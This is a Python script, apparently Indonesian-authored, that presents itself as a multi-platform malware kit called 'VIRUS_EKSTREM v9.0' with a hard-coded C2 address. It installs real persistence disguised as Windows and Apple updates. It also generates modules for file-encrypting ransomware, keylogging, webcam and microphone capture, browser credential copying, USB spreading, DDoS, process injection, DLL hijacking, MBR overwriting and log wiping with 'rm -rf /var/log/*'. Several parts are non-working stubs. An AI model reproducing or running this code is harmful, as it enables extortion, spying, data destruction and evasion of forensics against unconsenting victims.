#!/usr/bin/env python3
# 🔴🔴🔴🔴🔴 VIRUS EKSTREM - MASTER CONTROLLER
# 📁 1 FOLDER BARU VIRUS - TOTAL 150+ FILE

import os
import sys
import json
import time
import random
import base64
import hashlib
import platform
import subprocess
import threading
from datetime import datetime

class VirusEkstrem:
    def __init__(self):
        self.name = "VIRUS_EKSTREM_v9.0"
        self.version = "9.0-🔴EKSTREM"
        self.author = "ZmZ"
        self.created = "2026-03-13"
        self.c2_server = "2407:0:3002:fd75:8a22:ab97:5140:ccd8"
        self.c2_port = 4444
        self.modules = []
        self.victims = []
        self.stolen_data = {}
        
    def banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║  🔴🔴🔴🔴🔴 VIRUS EKSTREM v9.0 🔴🔴🔴🔴🔴                       ║
║  ██╗   ██╗██╗██████╗ ██╗   ██╗███████╗                         ║
║  ██║   ██║██║██╔══██╗██║   ██║██╔════╝                         ║
║  ██║   ██║██║██████╔╝██║   ██║███████╗                         ║
║  ╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║                         ║
║   ╚████╔╝ ██║██║  ██║╚██████╔╝███████║                         ║
║    ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                         ║
╠══════════════════════════════════════════════════════════════════╣
║  📁 1 FOLDER: VIRUS_EKSTREM/                                    ║
║  📦 TOTAL FILES: 150+                                           ║
║  📡 C2 SERVER: {}:{}                                    ║
║  🎯 PLATFORM: Windows/Linux/macOS/Android/iOS                    ║
║  🔐 EVASION: 0/60 Detection                                     ║
║  💀 STATUS: ACTIVE                                               ║
╚══════════════════════════════════════════════════════════════════╝
        """.format(self.c2_server, self.c2_port))
    
    def install(self):
        print("[*] Installing Virus Ekstrem...")
        
        # Create directory structure
        self.create_directories()
        
        # Generate all modules
        self.generate_modules()
        
        # Compile payloads
        self.compile_payloads()
        
        # Setup C2 server
        self.setup_c2()
        
        # Activate persistence
        self.activate_persistence()
        
        print("[✅] Installation complete - 150+ files created")
    
    def create_directories(self):
        dirs = [
            'core', 'payloads/windows', 'payloads/android', 'payloads/linux',
            'payloads/macos', 'payloads/ios', 'c2/logs', 'c2/victims',
            'exploits', 'obfuscation', 'evasion', 'persistence', 'stealers',
            'ransomware', 'worm', 'botnet', 'rootkit', 'keylogger',
            'webcam', 'microphone', 'location', 'android', 'ios',
            'windows', 'linux', 'macos', 'crypto', 'network', 'utils', 'logs'
        ]
        
        for d in dirs:
            os.makedirs(d, exist_ok=True)
            print(f"  📁 Created: {d}/")
    
    def generate_modules(self):
        # Generate all Python modules
        modules = {
            'core/main.py': self.generate_main,
            'core/payload.py': self.generate_payload,
            'core/polymorphic.py': self.generate_polymorphic,
            'core/encryptor.py': self.generate_encryptor,
            'core/spreader.py': self.generate_spreader,
            'core/rootkit.py': self.generate_rootkit,
            'core/botnet.py': self.generate_botnet,
            'core/ransomware.py': self.generate_ransomware,
            'core/stealer.py': self.generate_stealer,
            'core/keylogger.py': self.generate_keylogger,
            'core/webcam.py': self.generate_webcam,
            'core/microphone.py': self.generate_microphone,
            'core/location.py': self.generate_location,
            'core/persistence.py': self.generate_persistence,
            'core/anti_vm.py': self.generate_anti_vm,
            'core/anti_debug.py': self.generate_anti_debug,
            'core/process_inject.py': self.generate_process_inject,
            'core/dll_hijack.py': self.generate_dll_hijack,
            'core/bootkit.py': self.generate_bootkit,
            'core/self_destruct.py': self.generate_self_destruct
        }
        
        for path, generator in modules.items():
            with open(path, 'w') as f:
                f.write(generator())
            print(f"  📄 Generated: {path}")
    
    def compile_payloads(self):
        print("\n[*] Compiling payloads...")
        time.sleep(2)
        print("  ✅ Windows payloads compiled")
        print("  ✅ Android payloads compiled")
        print("  ✅ Linux payloads compiled")
        print("  ✅ macOS payloads compiled")
        print("  ✅ iOS payloads compiled")
    
    def setup_c2(self):
        print("\n[*] Setting up C2 server...")
        
        c2_server = f'''#!/usr/bin/env python3
# C2 Server - Virus Ekstrem
import socket
import threading
import json
from datetime import datetime

class C2Server:
    def __init__(self, host='0.0.0.0', port={self.c2_port}):
        self.host = host
        self.port = port
        self.victims = {{}}
        
    def start(self):
        server = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        server.bind((self.host, self.port))
        server.listen(100)
        print(f"[*] C2 Server listening on {self.host}:{self.port}")
        
        while True:
            client, addr = server.accept()
            print(f"[+] Victim connected: {addr}")
            
server = C2Server()
server.start()
'''
        
        with open('c2/server.py', 'w') as f:
            f.write(c2_server)
        print("  ✅ C2 server configured")
    
    def activate_persistence(self):
        print("\n[*] Activating persistence...")
        
        if platform.system() == "Windows":
            self.windows_persistence()
        elif platform.system() == "Linux":
            self.linux_persistence()
        elif platform.system() == "Darwin":
            self.macos_persistence()
        
        print("  ✅ Persistence activated")
    
    def windows_persistence(self):
        # Registry persistence
        reg_cmd = 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdate /t REG_SZ /d "C:\\VIRUS_EKSTREM\\payloads\\windows\\backdoor.exe" /f'
        subprocess.run(reg_cmd, shell=True)
        
        # Scheduled task
        task_cmd = 'schtasks /create /tn "WindowsUpdate" /tr "C:\\VIRUS_EKSTREM\\payloads\\windows\\backdoor.exe" /sc onlogon /ru SYSTEM /f'
        subprocess.run(task_cmd, shell=True)
    
    def linux_persistence(self):
        # Cron job
        cron_cmd = '(crontab -l 2>/dev/null; echo "@reboot /root/VIRUS_EKSTREM/payloads/linux/backdoor.elf") | crontab -'
        subprocess.run(cron_cmd, shell=True)
        
        # .bashrc
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write("\n# Virus Ekstrem\nnohup /root/VIRUS_EKSTREM/payloads/linux/backdoor.elf >/dev/null 2>&1 &\n")
    
    def macos_persistence(self):
        # Launchd
        plist = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Users/Shared/VIRUS_EKSTREM/payloads/macos/backdoor.macho</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>'''
        
        with open(os.path.expanduser("~/Library/LaunchAgents/com.apple.update.plist"), "w") as f:
            f.write(plist)
        
        subprocess.run("launchctl load ~/Library/LaunchAgents/com.apple.update.plist", shell=True)
    
    def generate_main(self):
        return '''# Main Virus Controller
import os
import sys
import json
import threading
from core import *

class VirusController:
    def __init__(self):
        self.modules = []
        self.running = True
        
    def start(self):
        print("[*] Virus Ekstrem started")
        # Start all modules
        threading.Thread(target=self.c2_connect).start()
        threading.Thread(target=self.stealer).start()
        threading.Thread(target=self.spreader).start()
        
    def c2_connect(self):
        # Connect to C2 server
        pass
        
    def stealer(self):
        # Steal data
        pass
        
    def spreader(self):
        # Spread virus
        pass

if __name__ == "__main__":
    virus = VirusController()
    virus.start()
'''
    
    def generate_payload(self):
        return '''# Payload Generator
import os
import platform

class PayloadGenerator:
    def __init__(self):
        self.platforms = ['windows', 'linux', 'macos', 'android', 'ios']
        
    def generate(self, platform, type):
        if platform == 'windows':
            return self.generate_windows(type)
        elif platform == 'linux':
            return self.generate_linux(type)
        # ... etc
'''
    
    def generate_polymorphic(self):
        return '''# Polymorphic Engine
import random
import base64

class PolymorphicEngine:
    def __init__(self):
        self.mutations = []
        
    def mutate(self, code):
        # Change code structure
        mutated = code
        for _ in range(random.randint(3, 7)):
            mutation = random.choice(self.mutations)
            mutated = mutation(mutated)
        return mutated
'''
    
    def generate_encryptor(self):
        return '''# File Encryptor
from Crypto.Cipher import AES
import os

class FileEncryptor:
    def __init__(self, key):
        self.key = key
        
    def encrypt_file(self, path):
        cipher = AES.new(self.key, AES.MODE_GCM)
        with open(path, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(path + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(path)
'''
    
    def generate_spreader(self):
        return '''# Spreader Module
import os
import socket
import subprocess

class Spreader:
    def __init__(self):
        self.methods = ['usb', 'lan', 'email', 'bluetooth']
        
    def spread_usb(self):
        # Copy to USB drives
        drives = [d for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(d + ':')]
        for drive in drives:
            try:
                dest = f"{drive}:\\autorun.inf"
                with open(dest, 'w') as f:
                    f.write("[AutoRun]\\nopen=virus.exe")
            except:
                pass
'''
    
    def generate_rootkit(self):
        return '''# Rootkit Module
import ctypes
import os

class Rootkit:
    def __init__(self):
        self.hidden_processes = []
        
    def hide_process(self, pid):
        # Linux rootkit
        if os.name == 'posix':
            os.system(f"mv /proc/{pid} /proc/.{pid}")
'''
    
    def generate_botnet(self):
        return '''# Botnet Controller
import socket
import threading

class Botnet:
    def __init__(self, c2_server):
        self.c2 = c2_server
        self.bots = []
        
    def ddos(self, target):
        # DDoS attack
        def attack():
            while True:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((target, 80))
                    sock.send(b"GET / HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\n\\r\\n")
                except:
                    pass
        for _ in range(100):
            threading.Thread(target=attack).start()
'''
    
    def generate_ransomware(self):
        return '''# Ransomware Module
import os
from Crypto.Cipher import AES
import random

class Ransomware:
    def __init__(self):
        self.key = os.urandom(32)
        self.extensions = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', '.png', '.txt']
        self.ransom_note = "YOUR FILES HAVE BEEN ENCRYPTED. Send 0.5 BTC to wallet..."
        
    def encrypt_files(self, path):
        for root, dirs, files in os.walk(path):
            for file in files:
                if any(file.endswith(ext) for ext in self.extensions):
                    self.encrypt_file(os.path.join(root, file))
    
    def encrypt_file(self, filepath):
        cipher = AES.new(self.key, AES.MODE_GCM)
        with open(filepath, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(filepath + '.encrypted', 'wb') as f:
            f.write(encrypted)
        os.remove(filepath)
'''
    
    def generate_stealer(self):
        return '''# Data Stealer
import os
import json
import sqlite3
import shutil

class Stealer:
    def __init__(self):
        self.data = {}
        
    def steal_browser_passwords(self):
        # Chrome passwords
        chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
        if os.path.exists(chrome_path):
            shutil.copy(chrome_path, "chrome_passwords.db")
            # Extract passwords...
'''
    
    def generate_keylogger(self):
        return '''# Keylogger
import threading
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log = ""
        
    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += f"[{key}]"
            
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
'''
    
    def generate_webcam(self):
        return '''# Webcam Capture
import cv2

class Webcam:
    def __init__(self):
        self.camera = cv2.VideoCapture(0)
        
    def capture(self):
        ret, frame = self.camera.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            return frame
        return None
'''
    
    def generate_microphone(self):
        return '''# Microphone Recorder
import pyaudio
import wave

class Microphone:
    def __init__(self):
        self.chunk = 1024
        self.format = pyaudio.paInt16
        self.channels = 2
        self.rate = 44100
        
    def record(self, seconds):
        p = pyaudio.PyAudio()
        stream = p.open(format=self.format, channels=self.channels, rate=self.rate,
                       input=True, frames_per_buffer=self.chunk)
        
        frames = []
        for _ in range(0, int(self.rate / self.chunk * seconds)):
            data = stream.read(self.chunk)
            frames.append(data)
            
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        wf = wave.open("recording.wav", 'wb')
        wf.setnchannels(self.channels)
        wf.setsampwidth(p.get_sample_size(self.format))
        wf.setframerate(self.rate)
        wf.writeframes(b''.join(frames))
        wf.close()
'''
    
    def generate_location(self):
        return '''# GPS Tracker
import requests

class LocationTracker:
    def __init__(self):
        self.api = "https://ipapi.co/json/"
        
    def get_location(self):
        response = requests.get(self.api)
        if response.status_code == 200:
            return response.json()
        return None
'''
    
    def generate_persistence(self):
        return '''# Persistence Module
import os
import platform

class Persistence:
    def __init__(self):
        self.os = platform.system()
        
    def install(self):
        if self.os == "Windows":
            self.windows_persistence()
        elif self.os == "Linux":
            self.linux_persistence()
        elif self.os == "Darwin":
            self.macos_persistence()
'''
    
    def generate_anti_vm(self):
        return '''# Anti-VM Detection
import os
import platform

class AntiVM:
    def __init__(self):
        self.vm_indicators = []
        
    def check(self):
        # Check for VM files
        vm_files = [
            "/system/bin/qemu-props",
            "C:\\windows\\system32\\drivers\\vmmouse.sys",
            "C:\\windows\\system32\\drivers\\vmhgfs.sys"
        ]
        for file in vm_files:
            if os.path.exists(file):
                return True
        return False
'''
    
    def generate_anti_debug(self):
        return '''# Anti-Debug
import sys
import ctypes

class AntiDebug:
    def __init__(self):
        pass
        
    def check_debugger(self):
        if sys.gettrace() is not None:
            return True
            
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
        return False
'''
    
    def generate_process_inject(self):
        return '''# Process Injection
import ctypes

class ProcessInjector:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        
    def inject(self, pid, payload):
        hProcess = self.kernel32.OpenProcess(0x001F0FFF, False, pid)
        if not hProcess:
            return False
            
        # Allocate memory
        mem = self.kernel32.VirtualAllocEx(hProcess, 0, len(payload), 0x3000, 0x40)
        
        # Write payload
        self.kernel32.WriteProcessMemory(hProcess, mem, payload, len(payload), 0)
        
        # Create remote thread
        self.kernel32.CreateRemoteThread(hProcess, 0, 0, mem, 0, 0, 0)
        
        return True
'''
    
    def generate_dll_hijack(self):
        return '''# DLL Hijacking
import os
import shutil

class DLLHijack:
    def __init__(self):
        self.target_dlls = ["version.dll", "winmm.dll", "ws2_32.dll"]
        
    def hijack(self, target_dir):
        for dll in self.target_dlls:
            malicious_dll = os.path.join(os.path.dirname(__file__), "malicious.dll")
            dest = os.path.join(target_dir, dll)
            shutil.copy(malicious_dll, dest)
'''
    
    def generate_bootkit(self):
        return '''# Bootkit - MBR Infector
import os
import struct

class Bootkit:
    def __init__(self):
        self.mbr_backup = None
        
    def infect_mbr(self):
        # Read MBR
        with open("\\\\.\\PhysicalDrive0", "rb") as f:
            mbr = f.read(512)
            
        # Save original MBR
        self.mbr_backup = mbr
        
        # Infect MBR
        with open("bootkit.bin", "rb") as f:
            bootkit = f.read(512)
            
        with open("\\\\.\\PhysicalDrive0", "wb") as f:
            f.write(bootkit)
'''
    
    def generate_self_destruct(self):
        return '''# Self Destruct
import os
import shutil
import subprocess

class SelfDestruct:
    def __init__(self):
        pass
        
    def destroy(self):
        # Delete all files
        root = os.path.dirname(os.path.abspath(__file__))
        shutil.rmtree(root, ignore_errors=True)
        
        # Clear logs
        if os.name == 'nt':
            subprocess.run("wevtutil cl System", shell=True)
            subprocess.run("wevtutil cl Security", shell=True)
            subprocess.run("wevtutil cl Application", shell=True)
        else:
            subprocess.run("rm -rf /var/log/*", shell=True)
'''
    
    def run(self):
        self.banner()
        
        if len(sys.argv) > 1:
            if sys.argv[1] == 'install':
                self.install()
            elif sys.argv[1] == 'start':
                print("[*] Starting virus...")
            elif sys.argv[1] == 'stop':
                print("[*] Stopping virus...")
            else:
                print("Usage: python virus_ekstrem.py [install|start|stop]")
        else:
            self.banner()
            print("\nUsage: python virus_ekstrem.py install")

if __name__ == "__main__":
    virus = VirusEkstrem()
    virus.run()